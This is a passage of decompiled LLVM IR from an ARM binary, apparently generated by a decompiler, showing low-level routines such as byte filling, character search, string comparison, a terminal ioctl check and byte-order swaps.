  %v5_142c0 = add i32 %v0_142c0, 1
  store i32 %v5_142c0, i32* @r1, align 4
  %v1_142c4 = add i32 %v0_142c4, -1
  store i32 %v1_142c4, i32* %r3.global-to-local, align 4
  %v7_142c4 = icmp eq i32 %v0_142c4, 1
  store i1 %v7_142c4, i1* %cpsr_z.global-to-local, align 1
  %v3_142c8 = add i32 %v2_142c8, 1
  %v4_142c8 = inttoptr i32 %v3_142c8 to i8*
  store i8 %v2_142c0, i8* %v4_142c8, align 1
  %v5_142c8 = load i32, i32* @ip, align 4
  %v6_142c8 = add i32 %v5_142c8, 1
  store i32 %v6_142c8, i32* @ip, align 4
  %v0_142cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_142cc, label %dec_label_pc_142e8, label %dec_label_pc_142d0

dec_label_pc_142d0:                               ; preds = %dec_label_pc_142c0
  %v0_142d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_142d0 = icmp eq i32 %v0_142d0, 0
  store i1 %v2_142d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142d0, label %dec_label_pc_142d8, label %dec_label_pc_142d0.dec_label_pc_142c0_crit_edge

dec_label_pc_142d0.dec_label_pc_142c0_crit_edge:  ; preds = %dec_label_pc_142d0
  %v0_142c4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_142c0

dec_label_pc_142d8:                               ; preds = %dec_label_pc_142d0, %dec_label_pc_142a4
  %v2_142e010 = phi i32 [ %v1_142a4, %dec_label_pc_142a4 ], [ %v6_142c8, %dec_label_pc_142d0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge, %dec_label_pc_142d8
  %v2_142e0 = phi i32 [ %v6_142e0, %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge ], [ %v2_142e010, %dec_label_pc_142d8 ]
  %v0_142e0.off0 = phi i8 [ %extract.t, %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge ], [ 0, %dec_label_pc_142d8 ]
  %v0_142dc = load i32, i32* %r3.global-to-local, align 4
  %v1_142dc = add i32 %v0_142dc, -1
  store i32 %v1_142dc, i32* %r3.global-to-local, align 4
  %v7_142dc = icmp eq i32 %v0_142dc, 1
  store i1 %v7_142dc, i1* %cpsr_z.global-to-local, align 1
  %v3_142e0 = add i32 %v2_142e0, 1
  %v4_142e0 = inttoptr i32 %v3_142e0 to i8*
  store i8 %v0_142e0.off0, i8* %v4_142e0, align 1
  %v5_142e0 = load i32, i32* @ip, align 4
  %v6_142e0 = add i32 %v5_142e0, 1
  store i32 %v6_142e0, i32* @ip, align 4
  %v0_142e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_142e4, label %dec_label_pc_142e8, label %dec_label_pc_142dc.dec_label_pc_142dc_crit_edge

dec_label_pc_142dc.dec_label_pc_142dc_crit_edge:  ; preds = %dec_label_pc_142dc
  %v0_142e0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_142e0.pre to i8
  br label %dec_label_pc_142dc

dec_label_pc_142e8:                               ; preds = %dec_label_pc_142c0, %dec_label_pc_142dc, %dec_label_pc_142a4, %dec_label_pc_142b8
  %v2_142e8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_142e8, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_142e0, { 1, 0 }
  uselistorder i32 %v0_142dc, { 1, 0 }
  uselistorder i32 %v6_142c8, { 0, 2, 1 }
  uselistorder i32 %v1_142b8, { 2, 1, 0 }
  uselistorder i32 %v2_142a8, { 1, 0 }
  uselistorder i32 %v1_14298, { 1, 0 }
  uselistorder i32 %v0_14294, { 1, 0 }
  uselistorder i32 %v6_14288, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_142e8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_142c0, { 1, 0 }
}

define i32 @function_142f0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_142f0:
  %v1_142f4 = urem i32 %arg1, 256
  %v0_143143 = load i32, i32* @r0, align 4
  %v1_143144 = urem i32 %v0_143143, 4
  %v2_143145 = icmp eq i32 %v1_143144, 0
  br i1 %v2_143145, label %dec_label_pc_1431c, label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %dec_label_pc_142f0, %dec_label_pc_14310
  %v0_14310 = phi i32 [ %v1_14310, %dec_label_pc_14310 ], [ %v0_143143, %dec_label_pc_142f0 ]
  %v1_142fc = inttoptr i32 %v0_14310 to i8*
  %v2_142fc = load i8, i8* %v1_142fc, align 1
  %v3_142fc = zext i8 %v2_142fc to i32
  store i32 %v3_142fc, i32* @r3, align 4
  %v9_14300 = icmp eq i32 %v3_142fc, %v1_142f4
  br i1 %v9_14300, label %dec_label_pc_143d0, label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %dec_label_pc_142fc
  %v2_14308 = icmp eq i8 %v2_142fc, 0
  br i1 %v2_14308, label %dec_label_pc_143cc, label %dec_label_pc_14310

dec_label_pc_14310:                               ; preds = %dec_label_pc_14308
  %v1_14310 = add i32 %v0_14310, 1
  %v1_14314 = urem i32 %v1_14310, 4
  %v2_14314 = icmp eq i32 %v1_14314, 0
  br i1 %v2_14314, label %dec_label_pc_1431c, label %dec_label_pc_142fc

dec_label_pc_1431c:                               ; preds = %dec_label_pc_14310, %dec_label_pc_142f0
  %v0_14320 = phi i32 [ %v0_143143, %dec_label_pc_142f0 ], [ %v1_14310, %dec_label_pc_14310 ]
  %v4_1431c = mul nuw nsw i32 %v1_142f4, 256
  %v5_1431c = or i32 %v4_1431c, %v1_142f4
  %v4_14324 = mul i32 %v5_1431c, 65536
  %v5_14324 = or i32 %v4_14324, %v5_1431c
  br label %dec_label_pc_14328

dec_label_pc_14328:                               ; preds = %dec_label_pc_143c4, %dec_label_pc_14364, %dec_label_pc_1431c
  %v0_1438c = phi i32 [ %v0_14320, %dec_label_pc_1431c ], [ %v4_14328, %dec_label_pc_14364 ], [ %v4_14328, %dec_label_pc_143c4 ]
  %v1_14328 = inttoptr i32 %v0_1438c to i32*
  %v2_14328 = load i32, i32* %v1_14328, align 4
  %v4_14328 = add i32 %v0_1438c, 4
  %v2_14330 = xor i32 %v2_14328, %v5_14324
  %v2_14334 = add i32 %v2_14330, 2130640639
  store i32 %v2_14334, i32* @ip, align 4
  %v2_1433c = add i32 %v2_14328, 2130640639
  %v1_14340 = sub i32 -1, %v2_14328
  %v2_14344 = xor i32 %v2_1433c, %v1_14340
  %v2_14350 = and i32 %v2_14344, -2130640640
  %v2_14358 = icmp eq i32 %v2_14350, 0
  br i1 %v2_14358, label %dec_label_pc_14364, label %dec_label_pc_1436c

dec_label_pc_14364:                               ; preds = %dec_label_pc_14328
  %v1_1434c = sub i32 -1, %v2_14330
  %v2_14354 = xor i32 %v2_14334, %v1_1434c
  %v2_1435c = and i32 %v2_14354, -2130640640
  %v2_14364 = icmp eq i32 %v2_1435c, 0
  br i1 %v2_14364, label %dec_label_pc_14328, label %dec_label_pc_1436c

dec_label_pc_1436c:                               ; preds = %dec_label_pc_14328, %dec_label_pc_14364
  %v2_1436c = inttoptr i32 %v0_1438c to i8*
  %v3_1436c = load i8, i8* %v2_1436c, align 1
  %v4_1436c = zext i8 %v3_1436c to i32
  store i32 %v4_1436c, i32* @r3, align 4
  %v9_14370 = icmp eq i32 %v4_1436c, %v1_142f4
  br i1 %v9_14370, label %dec_label_pc_143d0, label %dec_label_pc_1437c

dec_label_pc_1437c:                               ; preds = %dec_label_pc_1436c
  %v2_1437c = icmp eq i8 %v3_1436c, 0
  br i1 %v2_1437c, label %dec_label_pc_143cc, label %dec_label_pc_14384

dec_label_pc_14384:                               ; preds = %dec_label_pc_1437c
  %v1_14384 = add i32 %v0_1438c, 1
  %v2_14384 = inttoptr i32 %v1_14384 to i8*
  %v3_14384 = load i8, i8* %v2_14384, align 1
  %v4_14384 = zext i8 %v3_14384 to i32
  store i32 %v4_14384, i32* @r3, align 4
  %v9_14388 = icmp eq i32 %v4_14384, %v1_142f4
  br i1 %v9_14388, label %dec_label_pc_143d0, label %dec_label_pc_14394

dec_label_pc_14394:                               ; preds = %dec_label_pc_14384
  %v2_14394 = icmp eq i8 %v3_14384, 0
  br i1 %v2_14394, label %dec_label_pc_143cc, label %dec_label_pc_1439c

dec_label_pc_1439c:                               ; preds = %dec_label_pc_14394
  %v1_1439c = add i32 %v0_1438c, 2
  %v2_1439c = inttoptr i32 %v1_1439c to i8*
  %v3_1439c = load i8, i8* %v2_1439c, align 1
  %v4_1439c = zext i8 %v3_1439c to i32
  store i32 %v4_1439c, i32* @r3, align 4
  %v9_143a0 = icmp eq i32 %v4_1439c, %v1_142f4
  br i1 %v9_143a0, label %dec_label_pc_143d0, label %dec_label_pc_143ac

dec_label_pc_143ac:                               ; preds = %dec_label_pc_1439c
  %v2_143ac = icmp eq i8 %v3_1439c, 0
  br i1 %v2_143ac, label %dec_label_pc_143cc, label %dec_label_pc_143b4

dec_label_pc_143b4:                               ; preds = %dec_label_pc_143ac
  %v1_143b4 = add i32 %v0_1438c, 3
  %v2_143b4 = inttoptr i32 %v1_143b4 to i8*
  %v3_143b4 = load i8, i8* %v2_143b4, align 1
  %v4_143b4 = zext i8 %v3_143b4 to i32
  store i32 %v4_143b4, i32* @r3, align 4
  %v9_143b8 = icmp eq i32 %v4_143b4, %v1_142f4
  br i1 %v9_143b8, label %dec_label_pc_143d0, label %dec_label_pc_143c4

dec_label_pc_143c4:                               ; preds = %dec_label_pc_143b4
  %v2_143c4 = icmp eq i8 %v3_143b4, 0
  br i1 %v2_143c4, label %dec_label_pc_143cc, label %dec_label_pc_14328

dec_label_pc_143cc:                               ; preds = %dec_label_pc_14308, %dec_label_pc_143c4, %dec_label_pc_143ac, %dec_label_pc_14394, %dec_label_pc_1437c
  br label %dec_label_pc_143d0

dec_label_pc_143d0:                               ; preds = %dec_label_pc_142fc, %dec_label_pc_143b4, %dec_label_pc_1439c, %dec_label_pc_14384, %dec_label_pc_1436c, %dec_label_pc_143cc
  %v1_143d4 = phi i32 [ 0, %dec_label_pc_143cc ], [ %v1_143b4, %dec_label_pc_143b4 ], [ %v1_1439c, %dec_label_pc_1439c ], [ %v1_14384, %dec_label_pc_14384 ], [ %v0_1438c, %dec_label_pc_1436c ], [ %v0_14310, %dec_label_pc_142fc ]
  ret i32 %v1_143d4

; uselistorder directives
  uselistorder i32 %v4_14328, { 1, 0 }
  uselistorder i32 %v2_14328, { 0, 2, 1 }
  uselistorder i32 %v0_1438c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1431c, { 1, 0 }
  uselistorder i32 %v1_14310, { 1, 0, 2 }
  uselistorder i32 %v0_143143, { 2, 1, 0 }
  uselistorder i32 %v1_142f4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_143d0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_143cc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1436c, { 1, 0 }
  uselistorder label %dec_label_pc_142fc, { 1, 0 }
}

define i32 @function_143e0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_143e0:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_143e8 = call i32 @function_14428()
  %v0_143ec = load i32, i32* @r4, align 4
  ret i32 %v0_143ec
}

define i32 @function_143f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_143f8:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_328c4.747 to i32), i32* @r2, align 4
  %v0_14410 = call i32 @function_19e40()
  ret i32 %v0_14410
}

define i32 @function_14428() local_unnamed_addr {
dec_label_pc_14428:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_14428 = load i32, i32* @r4, align 4
  %v9_14428 = load i32, i32* @r6, align 4
  %v0_14430 = load i32, i32* @r0, align 4
  store i32 180260, i32* @r6, align 4
  store i32 %v0_14430, i32* @ip, align 4
  %v0_14440 = load i32, i32* @r1, align 4
  store i32 %v0_14440, i32* @r7, align 4
  %v0_14444 = load i32, i32* @r2, align 4
  store i32 %v0_14444, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_14430, 124
  br i1 %tmp, label %dec_label_pc_1447c, label %dec_label_pc_1444c

dec_label_pc_1444c:                               ; preds = %dec_label_pc_14428
  br label %dec_label_pc_14464

dec_label_pc_14458:                               ; preds = %dec_label_pc_14464
  br i1 %v2_14470, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_14458
  %v2_1445c = add i32 %v1_14474, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_14458, %bb
  %v0_144641 = phi i32 [ %v1_14474, %dec_label_pc_14458 ], [ %v2_1445c, %bb ]
  %v1_14460 = add i32 %v0_14460, 1
  br label %dec_label_pc_14464

dec_label_pc_14464:                               ; preds = %dec_label_pc_1444c, %bb15
  %v1_14474 = phi i32 [ %v0_14430, %dec_label_pc_1444c ], [ %v0_144641, %bb15 ]
  %v0_14460 = phi i32 [ ptrtoint ([8 x i8]* @global_var_22cd8.750 to i32), %dec_label_pc_1444c ], [ %v1_14460, %bb15 ]
  store i32 %v0_14460, i32* @r5, align 4
  %v2_14464 = icmp eq i32 %v1_14474, 0
  %v1_14468 = inttoptr i32 %v0_14460 to i8*
  %v2_14468 = load i8, i8* %v1_14468, align 1
  %v2_14470 = icmp eq i8 %v2_14468, 0
  br i1 %v2_14464, label %dec_label_pc_14470, label %dec_label_pc_14458

dec_label_pc_14470:                               ; preds = %dec_label_pc_14464
  br i1 %v2_14470, label %dec_label_pc_1447c, label %bb16

bb16:                                             ; preds = %dec_label_pc_14470
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144b8

dec_label_pc_1447c:                               ; preds = %dec_label_pc_14470, %dec_label_pc_14428
  store i32 %v0_14430, i32* @r2, align 4
  %v3_14484 = ashr i32 %v0_14430, 31
  store i32 %v3_14484, i32* @r3, align 4
  %v6_14498 = bitcast i32* %stack_var_-25 to i8*
  %v7_14498 = call i32 @function_1878c(i8* %v6_14498)
  %v1_144a0 = add i32 %v7_14498, -14
  store i32 %v1_144a0, i32* @r5, align 4
  %v0_144a4 = load i32, i32* @r6, align 4
  %v2_144a4 = add i32 %v0_144a4, -37724
  store i32 %v2_144a4, i32* @r1, align 4
  store i32 %v1_144a0, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_144b0 = call i32 @function_14000()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_144b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_144b8

dec_label_pc_144b8:                               ; preds = %bb16, %dec_label_pc_1447c
  %v0_144b8 = phi i32 [ %v0_14460, %bb16 ], [ %v0_144b8.pre, %dec_label_pc_1447c ]
  store i32 %v0_144b8, i32* @r0, align 4
  %v0_144bc = call i32 @function_13f70()
  %v0_144c0 = load i32, i32* @r7, align 4
  %v2_144c0 = icmp eq i32 %v0_144c0, 0
  br i1 %v2_144c0, label %bb17, label %dec_label_pc_144b8._crit_edge

dec_label_pc_144b8._crit_edge:                    ; preds = %dec_label_pc_144b8
  %v1_144cc.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_144b8
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_144b8._crit_edge, %bb17
  %v1_144cc = phi i32 [ %v1_144cc.pre, %dec_label_pc_144b8._crit_edge ], [ 0, %bb17 ]
  %v1_144c8 = add i32 %v0_144bc, 1
  %v3_144cc = icmp uge i32 %v1_144c8, %v1_144cc
  %v9_144cc = icmp eq i32 %v1_144c8, %v1_144cc
  %v2_144d0 = xor i1 %v3_144cc, true
  %v3_144d0 = or i1 %v9_144cc, %v2_144d0
  br i1 %v3_144d0, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_144c8, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_144e0 = phi i32 [ %v1_144cc, %bb18 ], [ %v1_144c8, %bb19 ]
  %v2_144d4 = xor i1 %v9_144cc, true
  %v3_144d4 = and i1 %v3_144cc, %v2_144d4
  br i1 %v3_144d4, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_144d8 = icmp eq i32 %v0_144e0, 0
  br i1 %v2_144d8, label %dec_label_pc_144fc, label %dec_label_pc_144e0

dec_label_pc_144e0:                               ; preds = %bb22
  store i32 %v0_144e0, i32* @r2, align 4
  %v0_144e4 = load i32, i32* @r5, align 4
  store i32 %v0_144e4, i32* @r1, align 4
  store i32 %v0_144c0, i32* @r0, align 4
  %v0_144ec = call i32 @function_14000()
  %v0_144f0 = load i32, i32* @r4, align 4
  %v1_144f0 = load i32, i32* @r7, align 4
  %v2_144f0 = add i32 %v1_144f0, %v0_144f0
  %v3_144f8 = add i32 %v2_144f0, -1
  %v4_144f8 = inttoptr i32 %v3_144f8 to i8*
  store i8 0, i8* %v4_144f8, align 1
  br label %dec_label_pc_144fc

dec_label_pc_144fc:                               ; preds = %bb22, %dec_label_pc_144e0
  %v0_144fc = load i32, i32* %r6.global-to-local, align 4
  %v2_144fc = icmp eq i32 %v0_144fc, 0
  br i1 %v2_144fc, label %dec_label_pc_1450c, label %dec_label_pc_14504

dec_label_pc_14504:                               ; preds = %dec_label_pc_144fc
  %v0_14504 = call i32 @function_12b24()
  %v0_14508 = load i32, i32* %r6.global-to-local, align 4
  %v2_14508 = inttoptr i32 %v0_14504 to i32*
  store i32 %v0_14508, i32* %v2_14508, align 4
  %v0_1450c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1450c

dec_label_pc_1450c:                               ; preds = %dec_label_pc_144fc, %dec_label_pc_14504
  %v0_1450c = phi i32 [ 0, %dec_label_pc_144fc ], [ %v0_1450c.pre, %dec_label_pc_14504 ]
  store i32 %v3_14428, i32* @r4, align 4
  store i32 %v9_14428, i32* %r6.global-to-local, align 4
  ret i32 %v0_1450c

; uselistorder directives
  uselistorder i1 %v3_144cc, { 1, 0 }
  uselistorder i32 %v0_14460, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14474, { 1, 0, 2 }
  uselistorder i32 %v0_14430, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1450c, { 1, 0 }
  uselistorder label %dec_label_pc_144fc, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_144b8, { 1, 0 }
  uselistorder label %dec_label_pc_14464, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_14528(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14528:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_14534 = load i32, i32* %r0.global-to-local, align 4
  %v1_1454823 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_14548.outer

dec_label_pc_14548.outer:                         ; preds = %dec_label_pc_14588, %dec_label_pc_14528
  %v0_14588.ph = phi i32 [ %v1_14588, %dec_label_pc_14588 ], [ %v0_14534, %dec_label_pc_14528 ]
  %v2_1454824 = load i8, i8* %v1_1454823, align 1
  %v2_1454c26 = icmp eq i8 %v2_1454824, 0
  br i1 %v2_1454c26, label %bb, label %dec_label_pc_14560

bb:                                               ; preds = %dec_label_pc_14548.backedge, %dec_label_pc_14548.outer
  store i32 %v0_14588.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1459c

dec_label_pc_14560:                               ; preds = %dec_label_pc_14548.outer, %dec_label_pc_14548.backedge
  %v1_1455432.in = phi i32 [ %v1_1455432, %dec_label_pc_14548.backedge ], [ %arg2, %dec_label_pc_14548.outer ]
  %v2_1454830 = phi i8 [ %v2_14548, %dec_label_pc_14548.backedge ], [ %v2_1454824, %dec_label_pc_14548.outer ]
  %v2_1455031.in.in = phi i8 [ %v2_14548, %dec_label_pc_14548.backedge ], [ %v2_1454824, %dec_label_pc_14548.outer ]
  %v0_1456c29 = phi i32 [ %v1_1456c, %dec_label_pc_14548.backedge ], [ %v0_14588.ph, %dec_label_pc_14548.outer ]
  %v1_1455432 = add i32 %v1_1455432.in, 1
  %v1_14560 = inttoptr i32 %v0_1456c29 to i8*
  %v2_14560 = load i8, i8* %v1_14560, align 1
  %v3_14560 = zext i8 %v2_14560 to i32
  store i32 %v3_14560, i32* %r0.global-to-local, align 4
  %v9_14564 = icmp eq i8 %v2_1454830, %v2_14560
  %v1_1456c = add i32 %v0_1456c29, 1
  br i1 %v9_14564, label %dec_label_pc_14548.backedge, label %dec_label_pc_14574

dec_label_pc_14548.backedge:                      ; preds = %dec_label_pc_14560, %dec_label_pc_14574
  %v1_14548 = inttoptr i32 %v1_1455432 to i8*
  %v2_14548 = load i8, i8* %v1_14548, align 1
  %v2_1454c = icmp eq i8 %v2_14548, 0
  br i1 %v2_1454c, label %bb, label %dec_label_pc_14560

dec_label_pc_14574:                               ; preds = %dec_label_pc_14560
  %v2_1455031.in = zext i8 %v2_1455031.in.in to i32
  %v2_14568 = mul nuw nsw i32 %v3_14560, 2
  %v2_1455031 = mul nuw nsw i32 %v2_1455031.in, 2
  %v4_14574 = load i32, i32* inttoptr (i32 182376 to i32*), align 8
  %v2_14578 = add i32 %v4_14574, %v2_14568
  %v3_14578 = inttoptr i32 %v2_14578 to i16*
  %v4_14578 = load i16, i16* %v3_14578, align 2
  %v2_1457c = add i32 %v4_14574, %v2_1455031
  %v3_1457c = inttoptr i32 %v2_1457c to i16*
  %v4_1457c = load i16, i16* %v3_1457c, align 2
  %v9_14580 = icmp eq i16 %v4_1457c, %v4_14578
  br i1 %v9_14580, label %dec_label_pc_14548.backedge, label %dec_label_pc_14588

dec_label_pc_14588:                               ; preds = %dec_label_pc_14574
  %v1_14588 = add i32 %v0_14588.ph, 1
  %v2_1458c = icmp eq i8 %v2_14560, 0
  br i1 %v2_1458c, label %dec_label_pc_1459c, label %dec_label_pc_14548.outer

dec_label_pc_1459c:                               ; preds = %dec_label_pc_14588, %bb
  %v1_145a0 = phi i32 [ %v0_14588.ph, %bb ], [ 0, %dec_label_pc_14588 ]
  ret i32 %v1_145a0

; uselistorder directives
  uselistorder i8 %v2_14548, { 2, 1, 0 }
  uselistorder i32 %v0_1456c29, { 1, 0 }
  uselistorder i32 %v0_14588.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14548.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14560, { 1, 0 }
}

define i32 @function_145ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_145ac:
  %stack_var_-68 = alloca i32, align 4
  %v2_145b4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_145b4, i32* @r1, align 4
  %v0_145b8 = call i32 @function_145d0()
  %v1_145bc = sub i32 1, %v0_145b8
  %v2_145bc = icmp ult i32 %v0_145b8, 2
  br i1 %v2_145bc, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_145ac
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_145ac, %bb
  %v1_145cc = phi i32 [ %v1_145bc, %dec_label_pc_145ac ], [ 0, %bb ]
  ret i32 %v1_145cc

; uselistorder directives
  uselistorder i32 %v0_145b8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_145d0() local_unnamed_addr {
dec_label_pc_145d0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_145d0 = load i32, i32* @r4, align 4
  %v6_145d0 = load i32, i32* @r5, align 4
  %v2_145d8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_145dc = load i32, i32* @r1, align 4
  store i32 %v0_145dc, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_145e8 = load i32, i32* @r0, align 4
  %v3_145e8 = call i32 @function_129e0(i32 %v0_145e8, i32 21505, i32 %v2_145d8)
  store i32 %v3_145e8, i32* %r0.global-to-local, align 4
  store i32 %v3_145e8, i32* @r5, align 4
  %v2_145ec = icmp eq i32 %v3_145e8, 0
  br i1 %v2_145ec, label %dec_label_pc_145f4, label %dec_label_pc_14638

dec_label_pc_145f4:                               ; preds = %dec_label_pc_145d0
  %v4_14600 = zext i8 %tmp to i32
  store i32 %v4_14600, i32* @ip, align 4
  %v3_14604 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_14604, i32* @r3, align 4
  %v1_14608 = load i32, i32* @r4, align 4
  %v2_14608 = add i32 %v1_14608, 4
  %v3_14608 = inttoptr i32 %v2_14608 to i32*
  %v0_1460c = load i32, i32* %r1.global-to-local, align 4
  %v1_1460c = load i32, i32* @r4, align 4
  %v2_1460c = add i32 %v1_1460c, 8
  %v3_1460c = inttoptr i32 %v2_1460c to i32*
  store i32 %v0_1460c, i32* %v3_1460c, align 4
  %v0_14610 = load i32, i32* %r0.global-to-local, align 4
  %v1_14610 = load i32, i32* @r4, align 4
  %v2_14610 = add i32 %v1_14610, 12
  %v3_14610 = inttoptr i32 %v2_14610 to i32*
  store i32 %v0_14610, i32* %v3_14610, align 4
  %v2_14614 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_14614, i32* @r1, align 4
  %v1_1461c = load i32, i32* @r4, align 4
  %v2_1461c = inttoptr i32 %v1_1461c to i32*
  store i32 %v3_14604, i32* %v2_1461c, align 4
  %v0_14620 = load i32, i32* @ip, align 4
  %v1_14620 = trunc i32 %v0_14620 to i8
  %v2_14620 = load i32, i32* @r4, align 4
  %v3_14620 = add i32 %v2_14620, 16
  %v4_14620 = inttoptr i32 %v3_14620 to i8*
  store i8 %v1_14620, i8* %v4_14620, align 1
  %v0_14624 = load i32, i32* @r4, align 4
  %v1_14624 = add i32 %v0_14624, 17
  store i32 %v1_14624, i32* %r0.global-to-local, align 4
  %v4_14628 = call i32 @function_1a128(i32 %v1_14624, i32 %v2_14614, i32 19, i32 %v3_14604)
  store i32 %v4_14628, i32* %r0.global-to-local, align 4
  %v0_1462c = load i32, i32* @r5, align 4
  store i32 %v0_1462c, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_14634 = inttoptr i32 %v4_14628 to i8*
  %v3_14634 = call i32 @function_13ed0(i8* %v2_14634, i32 %v0_1462c)
  store i32 %v3_14634, i32* %r0.global-to-local, align 4
  %v0_14638.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14638

dec_label_pc_14638:                               ; preds = %dec_label_pc_145d0, %dec_label_pc_145f4
  %v0_14638 = phi i32 [ %v3_145e8, %dec_label_pc_145d0 ], [ %v0_14638.pre, %dec_label_pc_145f4 ]
  store i32 %v0_14638, i32* %r0.global-to-local, align 4
  store i32 %v3_145d0, i32* @r4, align 4
  store i32 %v6_145d0, i32* @r5, align 4
  ret i32 %v0_14638

; uselistorder directives
  uselistorder i32 %v0_14638, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_14638, { 1, 0 }
}

define i32 @function_1464c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1464c:
  %v3_1464c = udiv i32 %arg1, 256
  %v1_14650 = mul i32 %arg1, 256
  %v4_14654 = and i32 %v1_14650, 65280
  %v5_14654 = or i32 %v4_14654, %v3_1464c
  ret i32 %v5_14654
}

define i32 @function_1465c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1465c:
  %v5_14674 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_14674
}

define i32 @function_1467c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1467c:
  %v3_1467c = udiv i32 %arg1, 256
  %v1_14680 = mul i32 %arg1, 256
  %v4_14684 = and i32 %v1_14680, 65280
  %v5_14684 = or i32 %v4_14684, %v3_1467c
  ret i32 %v5_14684
}

define i32 @function_1468c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1468c:
  %v5_146a4 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_146a4
}

define i32 @function_146ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_146ac:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %dec_label_pc_146cc, label %dec_label_pc_146c0

dec_label_pc_146c0:                               ; preds = %dec_label_pc_146ac
  ret i32 ptrtoint ([15 x i8]* @global_var_238a8.757 to i32)

dec_label_pc_146cc:                               ; preds = %dec_label_pc_146ac
  %v4_146d4 = mul i32 %arg1, 4
  %v5_146d4 = add i32 %v4_146d4, 180240
  %v6_146d4 = inttoptr i32 %v5_146d4 to i32*
